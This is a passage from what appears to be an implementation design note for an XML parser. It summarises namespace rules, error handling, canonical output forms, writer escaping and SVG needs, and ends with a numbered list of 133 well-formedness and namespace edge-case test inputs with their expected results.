  folding, no %-unescaping (NS §2.3). An empty value is not a namespace name. Relative URIs are
  deprecated but legal (the suite types them `error`, i.e. accept); processors need not check URI
  syntax (NS §8).
- **Prefix Declared**: every prefix other than `xml` and `xmlns` must be bound in scope.
- **No Prefix Undeclaring** (1.0): `xmlns:p=""` is an error (allowed in 1.1, section 12).
- **Reserved Prefixes and Namespace Names**: `xml` is bound to `http://www.w3.org/XML/1998/namespace`;
  it may be declared, but only to that URI. `xmlns` is bound to `http://www.w3.org/2000/xmlns/` and
  must never be declared. No other prefix may be bound to either URI, and neither may be the default
  namespace. **Element names must not have the prefix `xmlns`.** Other prefixes starting with `xml`
  (any case) are reserved, but processors **MUST NOT** treat them as fatal.
- **Attributes Unique** (NS §6.3): no two attributes with the same expanded name, e.g.
  `<x xmlns:n1="u" xmlns:n2="u"><bad n1:a="1" n2:a="2"/></x>`. `<good a="1" n1:a="2"/>` is legal even
  if the default namespace is also `u`. (Two `xmlns:p` on one tag already violate Unique Att Spec.)
- **Namespace well-formedness** (NS §7): element and attribute names match `QName` (at most one colon,
  not first or last: `<:a/>`, `<a:/>`, `<a:b:c/>` fail); **entity names, PI targets and notation names
  contain no colon** (NCName); ID/IDREF/ENTITY/NOTATION-typed values too for namespace validity. The
  doctype name and names in ELEMENT/ATTLIST declarations are QNames, matched as raw strings (DTDs are
  not namespace-aware).
- Violations MUST be reported (NS §8). The test suite marks them `not-wf` and runs every test with
  namespaces on except those with `NAMESPACE="no"`. With namespaces off, `a:b:c` and `:a` are plain
  legal names; the reader should support both modes.

## 10. Error model (§1.2, §5)

- **Fatal error**: any grammar mismatch, any WFC violation (the 12 WFCs: External Subset, PE Between
  Declarations, PEs in Internal Subset, Element Type Match, Unique Att Spec, No External Entity
  References, No < in Attribute Values, Legal Character, Entity Declared, Parsed Entity, No Recursion,
  In DTD), the §4.3.3 encoding failures, a misplaced TextDecl, the §4.4.4 forbidden references.
  **MUST detect and report.** After it the processor MAY keep scanning to report more errors and MAY
  expose unprocessed text, but MUST NOT continue normal processing (no more events/tree presented as
  valid data). For a pull reader: after the first fatal error every further read returns that error.
- **Error**: breaking a MUST that is not a WFC, and every VC. Results undefined; MAY detect, MAY
  recover. Examples: bad `xml:space` value (§2.10), `#fragment` in a system ID, wrong `lt`/`amp`
  redeclaration, reference in an attribute to an entity with no declaration read, unparsed entity in an
  EntityValue (§4.4.9), xml:id errors.
- **Warnings** (at user option, never errors): duplicate entity declarations, several ATTLISTs for one
  element, ATTLIST/content model mentioning undeclared element types.
- "At user option" means the behavior must be switchable by the user.
- A non-validating processor must still check every WFC in what it reads, but cannot see WFC
  violations hidden in unread external entities (§5.2).

## 11. Other W3C pieces, briefly

- **Infoset** (what a document model must be able to represent): document (children, document
  element, notations, unparsed entities, base URI, encoding scheme, standalone, version, **all
  declarations processed**), element (namespace name, local name, prefix, children, attributes,
  namespace attributes, in-scope namespaces, base URI, parent), attribute (names, **normalized
  value**, **specified** vs defaulted, attribute type, references), PI (target, content, base URI,
  notation), **unexpanded entity reference** (name, system/public ID: needed when an external entity
  is not read), character (code, **element content whitespace**), comment, DTD (system/public ID,
  children = PIs in the DTD), unparsed entity, notation, namespace item. The infoset deliberately
  **drops** (Appendix D): the doctype name, content models, attribute order and quote style,
  whitespace inside tags and outside the root, the space after a PI target, `<a/>` vs `<a></a>`,
  character references vs literals, CRLF vs LF, entity and CDATA boundaries, DTD comments and
  declaration order, ignored declarations, attribute defaults as declared. **A style-preserving
  round-trip model must keep exactly these extras**, plus the XML declaration text and the BOM.
- **Canonical XML 1.0** (W3C c14n, used for signatures, different from section 14's test form): UTF-8, LF,
  no XML declaration or DTD, entities and defaults expanded, CDATA replaced by escaped text, `<a></a>`,
  namespace declarations first sorted by prefix, attributes sorted by (namespace URI, local name),
  `"` quoting; text escapes `&amp; &lt; &gt; &#xD;`; attribute escapes `&amp; &lt; &quot; &#x9; &#xA;
  &#xD;`; comments optional; superfluous namespace declarations removed.
- **xml:space** (§2.10): `default` or `preserve`, inherited; other values are an error. Advisory for
  applications; the parser still passes all whitespace. **xml:lang** (§2.12): BCP 47 tag or empty
  (empty cancels an inherited value); inherited. **xml:base** (XML Base): sets the base URI for
  relative references in scope; affects entity resolution only if the application wants it. All three
  use the `xml` prefix, which is bound without declaration.
- **xml:id** (W3C REC 2005): value normalized as type ID (trim and collapse spaces) even if
  undeclared; must be an NCName, unique in the document, and if declared must be declared `ID`.
  Violations are non-fatal "xml:id errors".
- **xml-stylesheet** PI: pseudo-attributes (`href` required, `type`, `title`, `media`, `charset`,
  `alternate`) parsed from the PI data with attribute-like syntax; meaningful only in the prolog. An
  application layer on top of PI events, not a parser concern.
- Out of scope: DTD validation, XML Schema, RELAX NG, XInclude (a post-parse transform), XPath/XSLT,
  XML Signature. The document model should make an XPath-like lookup layer possible later.

## 12. XML 1.1 and Namespaces 1.1 differences

- `VersionNum ::= '1.1'`; the XML declaration is REQUIRED (a document without one is 1.0). Each
  external entity may be labeled 1.0 or 1.1, but the document entity's version governs all
  (§4.3.4). 1.1 processors must also process 1.0 (§5.1).
- `[2] Char ::= [#x1-#xD7FF] | [#xE000-#xFFFD] | [#x10000-#x10FFFF]` and
  `[2a] RestrictedChar ::= [#x1-#x8] | [#xB-#xC] | [#xE-#x1F] | [#x7F-#x84] | [#x86-#x9F]`.
  `document` excludes any literal RestrictedChar: C0 controls become legal **only as char refs**
  (`&#x1;` OK, literal U+0001 still fatal), and **literal C1 controls and DEL, legal in 1.0, become
  fatal** (NEL excepted). `&#0;` stays illegal.
- End of line (§2.11): `CR LF`, `CR NEL`, `NEL` (U+0085), `LSEP` (U+2028) and lone `CR` all become
  `LF`. NEL and LSEP inside the XML or text declaration are fatal. `S` itself is unchanged.
- Names: identical to 1.0 Fifth Edition (the 5th edition adopted the 1.1 name ranges); no difference
  left.
- §2.13 normalization checking: documents SHOULD be "fully normalized" (NFC plus no construct starting
  with a composing character); processors SHOULD offer a check and MUST NOT transform the input.
- Namespaces 1.1: namespace names are IRIs; **prefix undeclaring** `xmlns:p=""` is legal and
  unbinds `p` until rebound (using `p:` inside is then an error); `xml` and `xmlns` cannot be
  undeclared.
- Adoption: .NET, expat and browsers do not support 1.1; libxml2 parses it as 1.0 with a warning;
  Xerces supports it. The suite marks 1.1 tests with `VERSION="1.1"` or the `XML1.1`/`NS1.1`
  recommendation and expects `<?xml version="1.1"?>` at the start of their canonical output, with C0/C1
  controls written as decimal char refs.

## 13. What SVG and other real files need

- **Namespaces**: SVG elements in `http://www.w3.org/2000/svg`; `xlink:href` in
  `http://www.w3.org/1999/xlink` (SVG 2 prefers plain `href` but files carry both); editor namespaces
  (Inkscape `inkscape:`/`sodipodi:`, Illustrator `i:`/`x:`/`graph:`, Sketch, RDF/Dublin Core metadata
  inside `<metadata>`). Consumers match by (namespace, local name), never by prefix. Some SVGs omit
  `xmlns` entirely (well-formed; tolerant consumers treat them as SVG anyway).
- **Adobe Illustrator exports**: a doctype with the SVG 1.1 external DTD **and** an internal subset
  declaring namespace URIs as entities, then used in `xmlns` attributes:
  ```
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
      <!ENTITY ns_svg "http://www.w3.org/2000/svg">
      <!ENTITY ns_xlink "http://www.w3.org/1999/xlink">
      <!ENTITY ns_ai "http://ns.adobe.com/AdobeIllustrator/10.0/">
  ]>
  <svg version="1.1" xmlns="&ns_svg;" xmlns:xlink="&ns_xlink;" xmlns:i="&ns_ai;">
  ```
  So **internal-subset general entities, expansion inside attribute values, and namespace resolution
  after normalization are required** for SVG in practice. The external DTD must not be fetched; since
  it exists, undeclared references are VC-only (section 7.6), and its `#FIXED` xmlns/xlink defaults are
  absent unless the DTD is read. Illustrator also embeds large base64 or private data (`<i:pgf>`,
  `<foreignObject>`), and older files use `&#x...;` heavily.
- `<style>` and `<script>` content, usually inside `<![CDATA[...]]>` (CSS `>` selectors, JS `<`);
  text and CDATA pieces must concatenate into one logical string.
- `xml:space="preserve"` on `<text>` (deprecated in SVG 2 but common; Inkscape writes it on the root).
- **Huge attribute values**: path data `d`, `points`, `transform` lists, embedded `data:` URIs in
  `href` reaching megabytes; attribute scanning must be linear and streaming-friendly, and limits must
  be configurable. COLLADA puts megabytes of floats in text nodes; TMX/Tiled stores tile layers as
  base64/CSV text (optionally compressed); MSBuild/csproj, XAML, Android layouts and config files lean
  on namespaces and attributes; XHTML uses `&nbsp;` and friends from its DTD (skipped entity unless
  the application supplies the HTML entity set).
- SVG fonts, `<!ENTITY>` for repeated fragments, and parameter entities are rare but occur in
  hand-written files; conditional sections never appear in documents (internal subset forbids them).

## 14. The conformance suite and its canonical form

- `xmlts20130923` (<https://www.w3.org/XML/Test/>): `xmlconf/xmlconf.xml` includes per-contributor
  catalogs (James Clark `xmltest`, Sun, OASIS/NIST, IBM, Fuji Xerox `japanese`, Edinburgh `eduni`
  errata, XML 1.1 and namespaces). About 2 240 `TEST` entries: 766 `valid`, 188 `invalid`,
  1 252 `not-wf`, 32 `error`; 432 have an `OUTPUT` file.
- Attributes (`testcases.dtd`): `TYPE` (all parsers accept `valid`; non-validators also accept
  `invalid`; nobody accepts `not-wf` unless it depends on unread external entities; `error` results
  are optional), `ENTITIES` (`none|general|parameter|both`: which external entities must be read to
  see the error or output), `OUTPUT` (second canonical form), `OUTPUT3` (third form, validating only),
  `SECTIONS`, `RECOMMENDATION` (`XML1.0`, `XML1.1`, `NS1.0`, `NS1.1`, errata editions), `VERSION`,
  `EDITION` (skip tests whose `EDITION` list lacks `5`), `NAMESPACE` (`no` = run with namespaces off),
  `URI` (relative to the catalog's `xml:base`).
- **James Clark's canonical XML** (`xmltest/canonxml.html`):
  ```
  CanonXML ::= Pi* element Pi*
  element  ::= Stag (Datachar | Pi | element)* Etag
  Stag     ::= '<' Name Atts '>'          Etag ::= '</' Name '>'
  Pi       ::= '<?' Name ' ' (((Char - S) Char*)? - (Char* '?>' Char*)) '?>'
  Atts     ::= (' ' Name '=' '"' Datachar* '"')*
  Datachar ::= '&amp;' | '&lt;' | '&gt;' | '&quot;' | '&#9;' | '&#10;' | '&#13;'
             | (Char - ('&' | '<' | '>' | '"' | #x9 | #xA | #xD))
  ```
  UTF-8; no XML declaration, no doctype, **no comments**, no whitespace outside the root, PIs kept
  (before and after the root too) as `<?target data?>` with **exactly one space even when data is
  empty** (`<?x?>` → `<?x ?>`); every element as start plus end tag; attributes (including defaulted
  ones) **sorted by name in code-point order**, raw qualified names, double quotes; entities expanded;
  CDATA written as escaped data; the same escapes in text and attributes (so every LF in text becomes
  `&#10;`); whitespace in element content kept as data; **no trailing newline**.
- **Second canonical form** (`OUTPUT`): as above, plus, when the DTD declares notations,
  `<!DOCTYPE root [\n` + one line per notation **sorted by name**
  (`<!NOTATION n PUBLIC 'pub' 'sys'>`, `<!NOTATION n PUBLIC 'pub'>` or `<!NOTATION n SYSTEM 'sys'>`,
  single quotes) + `]>\n` before the root. All declared notations appear, used or not.
- **Third form** (`OUTPUT3`): adds unparsed entity declarations and drops ignorable whitespace;
  validating parsers only, so skip it.
- XML 1.1 outputs begin with `<?xml version="1.1"?>` and escape C0/C1 controls as `&#N;`.

## 15. Writer rules

- Text: escape `&` and `<`; escape `>` at least after `]]` (always escaping it is simplest); write CR
  as `&#13;` (a literal CR would be normalized away). Attribute values: escape `&`, `<`, the delimiting
  quote, and TAB/LF/CR as `&#9;`/`&#10;`/`&#13;` (literal ones would normalize to spaces).
- Code points outside `Char` (U+0000, C0 controls, lone surrogates, U+FFFE/FFFF) **cannot be
  represented in XML 1.0 at all**: fail or require an explicit encoding scheme.
- CDATA cannot contain `]]>`: split as `]]]]><![CDATA[>`. Comments cannot contain `--` or end with
  `-`; PI data cannot contain `?>`; names must be valid Names/QNames; there is no escape inside
  comments, PIs, CDATA or names, so reject or rewrite.
- Characters not encodable in the output encoding: char refs in text and attributes, error elsewhere.
- Namespace-aware writing must emit declarations for every used (prefix, URI) pair not already in
  scope, never rebind `xml`/`xmlns`, and cannot put an unprefixed attribute into a namespace.

## 16. Edge cases worth a test

"OK:" = well-formed with the stated result; "fatal:" = must fail with that reason; "NS:" = fails only
with namespaces on. `\t \n \r` are the control characters, `U+XXXX` a literal code point.

### Document structure and XML declaration
1. `` (empty input) → fatal: no root element.
2. `  \n` → fatal: no root element.
3. `<a/><b/>` → fatal: two roots.
4. `x<a/>` → fatal: text before root.
5. `<a/>x` → fatal: text after root.
6. `<a/>&#32;` → fatal: reference after root (Misc allows literal S only).
7. `<a/>\n<!--c-->\n<?p d?>\n` → OK: comment and PI after root.
8. ` <?xml version="1.0"?><a/>` → fatal: XML declaration not at start (reserved PI target).
9. `<!--c--><?xml version="1.0"?><a/>` → fatal: same.
10. `<?xml version="1.0" standalone="yes" encoding="UTF-8"?><a/>` → fatal: pseudo-attribute order.
11. `<?xml encoding="UTF-8"?><a/>` → fatal: version missing (a TextDecl is not an XMLDecl).
12. `<?xml version = '1.0' encoding="utf-8" ?><a/>` → OK: S around `=`, mixed quotes, lowercase name.
13. `<?xml version="1.0'?><a/>` → fatal: mismatched quotes.
14. `<?xml version="2.0"?><a/>` → fatal: VersionNum.
15. `<?xml version="1.7"?><a/>` → OK for a 1.0 processor, parsed as 1.0.
16. `<?xml version="1.0" standalone="YES"?><a/>` → fatal: only `yes`/`no`.
17. `<?xml version="1.0" encoding=""?><a/>` → fatal: empty EncName.
18. `<?xml version="1.0"?><a/><!DOCTYPE a>` → fatal: doctype after root.
19. `<!DOCTYPE a><!DOCTYPE a><a/>` → fatal: two doctypes.
20. `<!DOCTYPE a><b/>` → OK: root name mismatch is only a VC.

### Characters and encoding
21. `<a>U+0001</a>` → fatal: not Char (1.0).
22. `<a>&#x1;</a>` → fatal in 1.0 (legal in 1.1).
23. `<a>U+0085 U+007F U+009F</a>` → OK in 1.0: legal characters (fatal as literals in 1.1, except NEL
    which 1.1 turns into LF).
24. `<a>U+FFFE</a>`, `<a>&#xFFFF;</a>` → fatal.
25. `<a>&#xD800;</a>` → fatal: surrogate.
26. `<a>&#x10FFFF;</a>` → OK; `<a>&#x110000;</a>` → fatal.
27. `<a>&#0;</a>` → fatal in 1.0 and 1.1.
28. `<a>&#0000065;&#x0041;</a>` → OK: text `AA`.
29. `<a>&#X41;</a>`, `<a>&#x;</a>`, `<a>&#65</a>`, `<a>&#x41 ;</a>` → fatal.
30. `EF BB BF <a/>` → OK: UTF-8 BOM dropped.
31. `EF BB BF EF BB BF <a/>` → fatal: second U+FEFF is a character in the prolog.
32. `FF FE` + UTF-16LE `<a/>` → OK.
33. UTF-16LE `<a/>` without BOM → fatal: detected as UTF-8, NUL bytes.
34. `FE FF` + UTF-16BE `<?xml version="1.0" encoding="UTF-8"?><a/>` → fatal: declaration contradicts
    the BOM.
35. `<a>C3 28</a>`, `<a>C0 AF</a>`, `<a>ED A0 80</a>` (UTF-8 bytes) → fatal: ill-formed UTF-8.
36. `<?xml version="1.0" encoding="ISO-8859-1"?><a>E9</a>` → OK (if supported): text `é`.
37. `<?xml version="1.0" encoding="x-unknown"?><a/>` → fatal: unsupported encoding.
38. `<a>U+FEFF</a>` → OK: ZWNBSP as text.

### End of line
39. `<a>x\r\ny\rz\r\r\nw</a>` → OK: text `x\ny\nz\n\nw`.
40. `<a>&#13;&#10;</a>` → OK: text `\r\n` (char refs are not normalized).
41. `<a><![CDATA[x\r\ny]]></a>` → OK: text `x\ny`.
42. `<?p a\r\nb?><a/>` → OK: PI data `a\nb`.

### Names and tags
43. `<1a/>`, `<-a/>`, `<.a/>`, `<·a/>` → fatal: invalid name start.
44. `<a1-._·/>` → OK.
45. `<é/>`, `<中文/>`, `<U+10000/>` → OK (the last is fatal before the 5th edition).
46. `<a×/>` (U+00D7), `<aU+037E/>`, `<aU+00A0/>` → fatal.
47. `<xmlfoo/>` → OK: reserved prefix of names is not an error.
48. `< a/>`, `</ a>` → fatal: whitespace after `<` / `</`.
49. `<a></a >` → OK.
50. `<a/ >`, `<a / >` → fatal: `/>` must be contiguous.
51. `<a></A>` → fatal: Element Type Match is case-sensitive.
52. `<a><b></a></b>` → fatal: improper nesting.
53. `<a>` → fatal: unclosed at EOF.

### Attributes
54. `<a b="1" b="2"/>` → fatal: Unique Att Spec.
55. `<a b="1"c="2"/>` → fatal: missing S between attributes.
56. `<a b = '1' />` → OK.
57. `<a b=1/>`, `<a b/>` → fatal: unquoted / missing value.
58. `<a b="<"/>` → fatal; `<a b=">"/>` → OK; `<a b="]]>"/>` → OK.
59. `<a b="&"/>`, `<a b="&amp"/>` → fatal.
60. `<a b='"' c="'"/>` → OK.
61. `<a b="x\ty\nz\r\nw"/>` → OK: `x y z w`.
62. `<a b="x&#9;y&#10;z&#13;"/>` → OK: `x\ty\nz\r`.
63. `<a b="  x  "/>` → OK: `  x  ` (no DTD: CDATA, no trimming).
64. `<!DOCTYPE a [<!ATTLIST a b NMTOKENS #IMPLIED>]><a b="  p   q "/>` → OK: `p q`.
65. `<!DOCTYPE a [<!ATTLIST a b NMTOKENS #IMPLIED>]><a b="&#32;p&#9;q"/>` → OK: `p\tq` (tab kept,
    leading #x20 trimmed).
66. `<!DOCTYPE a [<!ENTITY t "x&#9;y">]><a b="&t;"/>` → OK: `x y` (whitespace in replacement text).
67. `<!DOCTYPE a [<!ATTLIST a b CDATA "d">]><a/>` → OK: `b="d"`, specified = false.
68. `<!DOCTYPE a [<!ATTLIST a b CDATA "1"><!ATTLIST a b CDATA "2">]><a/>` → OK: `b="1"` (first
    binds).
69. `<!DOCTYPE a [<!ATTLIST a b CDATA "<">]><a/>` → fatal: No < in Attribute Values.

### Character data, CDATA, comments, PIs
70. `<a>]]></a>` → fatal; `<a>]]&gt;</a>` → OK: `]]>`; `<a>]] ]></a>` → OK.
71. `<a>&#60;b/&#62;</a>` → OK: text `<b/>`, no element.
72. `<a>&amp;lt;</a>` → OK: text `&lt;`.
73. `<a><![CDATA[<&>]]></a>` → OK: text `<&>`.
74. `<a><![CDATA[]]]]></a>` → OK: text `]]`.
75. `<a><![cdata[x]]></a>` → fatal: keyword is case-sensitive.
76. `<![CDATA[x]]><a/>` → fatal: CDATA outside the root.
77. `<a><![CDATA[<![CDATA[x]]>]]></a>` → fatal: no nesting, leftover `]]>` in content.
78. `<!-- a -- b --><a/>` → fatal: `--` in comment.
79. `<!-- a ---><a/>` → fatal: `--->`.
80. `<!----><a/>` → OK: empty comment; `<!---><a/>` → fatal.
81. `<!-- <a> & --><a/>` → OK: markup not recognized in comments.
82. `<a><?pi?></a>` → OK: target `pi`, data empty; `<?pi  x ?>` → data `x ` (leading S dropped).
83. `<a><?pi?x?></a>` → fatal: target must be followed by S or `?>`.
84. `<a><?XmL x?></a>` → fatal: reserved target.
85. `<?xml-stylesheet href="s.css" type="text/css"?><a/>` → OK.
86. `<? pi?><a/>`, `<??><a/>` → fatal.

### References and the DTD
87. `<a>&e;</a>` → fatal: Entity Declared (no DTD).
88. `<a>&amp;&lt;&gt;&apos;&quot;</a>` → OK: `&<>'"` without declarations.
89. `<!DOCTYPE a [<!ENTITY e "v">]><a>&e;</a>` → OK: `v`.
90. `<!DOCTYPE a [<!ENTITY e "1"><!ENTITY e "2">]><a>&e;</a>` → OK: `1` (first binds).
91. `<!DOCTYPE a SYSTEM "x.dtd"><a>&e;</a>` → OK for a non-reading parser: skipped entity `e`.
92. `<?xml version="1.0" standalone="yes"?><!DOCTYPE a SYSTEM "x.dtd"><a>&e;</a>` → fatal.
93. `<!DOCTYPE a [<!ENTITY % p "<!ENTITY e 'v'>"> %p;]><a>&e;</a>` → OK: `v`.
94. `<!DOCTYPE a [<!ENTITY % p "<!ENTITY e1 'v'>"> %p;]><a>&e2;</a>` → OK (invalid only, errata E13).
95. `<!DOCTYPE a [<!ENTITY % p "x"><!ENTITY e "%p;">]><a/>` → fatal: PE inside a declaration in the
    internal subset.
96. `<!DOCTYPE a [%p;]><a/>` → OK for a non-validating parser: undeclared PE is a VC (Sun
    `invalid/dtd06`).
97. `<!DOCTYPE a [<!ENTITY % ext SYSTEM "x.ent"> %ext; <!ENTITY e "v">]><a>&e;</a>` (x.ent not read) →
    OK: `e` must not be processed, `&e;` reported as skipped.
98. `<a>%p;</a>` → OK: text `%p;`.
99. `<!DOCTYPE a [<![INCLUDE[ <!ENTITY e "v"> ]]>]><a/>` → fatal: conditional section in the internal
    subset.
100. `<!DOCTYPE a [<!ENTITY e "&e;">]><a>&e;</a>` → fatal: No Recursion.
101. `<!DOCTYPE a [<!ENTITY a "&b;"><!ENTITY b "&a;">]><a/>` → OK: never referenced (only referenced
     entities must be well-formed).
102. `<!DOCTYPE a [<!ENTITY e "&undefined;">]><a/>` → OK: bypassed, never expanded.
103. `<!DOCTYPE a [<!ENTITY e "<b>">]><a>&e;</b></a>` → fatal: element crosses an entity boundary.
104. `<!DOCTYPE a [<!ENTITY e "<b/>">]><a>&e;</a>` → OK: child element `b`.
105. `<!DOCTYPE a [<!ENTITY e "&#60;">]><a>&e;</a>` → fatal: replacement `<` is re-parsed.
106. `<!DOCTYPE a [<!ENTITY e "&#38;#60;">]><a>&e;</a>` → OK: text `<`.
107. `<!DOCTYPE a [<!ENTITY x "&lt;">]><a b="&x;"/>` → OK: `b="<"`.
108. `<!DOCTYPE a [<!ENTITY x "&#60;">]><a b="&x;"/>` → fatal: No < in Attribute Values.
109. `<!DOCTYPE a [<!ENTITY q "'">]><a b='&q;'/>` → OK: `b="'"` (included in literal).
110. `<!DOCTYPE a [<!ENTITY e SYSTEM "e.xml">]><a b="&e;"/>` → fatal: No External Entity References.
111. `<!DOCTYPE a [<!NOTATION n SYSTEM "n"><!ENTITY e SYSTEM "e.png" NDATA n>]><a>&e;</a>` → fatal:
     Parsed Entity.
112. `<!DOCTYPE a [<!ATTLIST a b CDATA "&e;"><!ENTITY e "v">]><a/>` → fatal: entity declared after its
     use in a default.
113. `<!DOCTYPE a [<!ENTITY % xx '&#37;zz;'><!ENTITY % zz '&#60;!ENTITY t "ok">'> %xx;]><a>&t;</a>` →
     OK: `ok` (Appendix D).
114. `<!DOCTYPE a PUBLIC "x"><a/>` → fatal: doctype PUBLIC needs a system literal;
     `<!DOCTYPE a PUBLIC "{" "s">` → fatal: `{` not a PubidChar.
115. `<!doctype a><a/>` → fatal.
116. `<!DOCTYPE a [<!ENTITY e "x">]><a>&e</a>` → fatal: missing `;`.

### Namespaces
117. `<p:a xmlns:p="u"/>` → OK: {u}a (declared on the same tag).
118. `<a p:x="1" xmlns:p="u"/>` → OK: attribute order irrelevant.
119. `<p:a/>` → NS: unbound prefix (OK with namespaces off, name `p:a`).
120. `<a xmlns="u" b="1"/>` → OK: element {u}a, attribute `b` in no namespace.
121. `<x xmlns:n1="u" xmlns:n2="u"><y n1:a="1" n2:a="2"/></x>` → NS: Attributes Unique.
122. `<x xmlns:n1="u" xmlns="u"><y a="1" n1:a="2"/></x>` → OK.
123. `<a xmlns:p=""/>` → NS: No Prefix Undeclaring (legal in 1.1); `<a xmlns=""/>` → OK.
124. `<a xmlns:xml="http://www.w3.org/XML/1998/namespace"/>` → OK; `<a xmlns:xml="u"/>` → NS.
125. `<a xmlns:xmlns="u"/>`, `<a xmlns:p="http://www.w3.org/2000/xmlns/"/>`,
     `<a xmlns="http://www.w3.org/XML/1998/namespace"/>` → NS.
126. `<xmlns:a/>` → NS: element prefix `xmlns`.
127. `<a xml:lang="en" xml:space="preserve"/>` → OK: `xml` needs no declaration.
128. `<a:b:c/>`, `<:a/>`, `<a:/>` → NS (all OK with namespaces off).
129. `<?a:b?><r/>`, `<!DOCTYPE r [<!ENTITY a:b "x">]><r/>` → NS: colon in PI target / entity name.
130. `<xmlfoo:a xmlns:xmlfoo="u"/>` → OK: reserved prefix must not be fatal.
131. `<a xmlns:p="u"><p:b xmlns:p="v"/><p:c/></a>` → OK: b in {v}, c in {u}.
132. `<!DOCTYPE svg [<!ENTITY ns_svg "http://www.w3.org/2000/svg">]><svg xmlns="&ns_svg;"/>` → OK:
     root in the SVG namespace.
133. `<!DOCTYPE a [<!ATTLIST a xmlns:p CDATA #FIXED "u">]><a><p:b/></a>` → OK: namespace declared by a
     default attribute.
